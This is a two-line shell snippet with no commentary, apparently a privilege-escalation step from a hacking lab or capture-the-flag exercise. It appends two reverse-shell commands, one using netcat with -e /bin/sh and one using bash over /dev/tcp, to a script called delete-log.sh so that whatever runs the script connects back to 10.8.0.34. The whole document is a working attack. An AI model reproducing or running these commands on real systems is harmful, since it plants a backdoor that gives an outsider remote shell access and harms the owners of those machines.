echo 'nc -e /bin/sh 10.8.0.34 1236' >> delete-log.sh
echo 'bash -i >& /dev/tcp/10.8.0.34/1235 0>&1' >> delete-log.sh
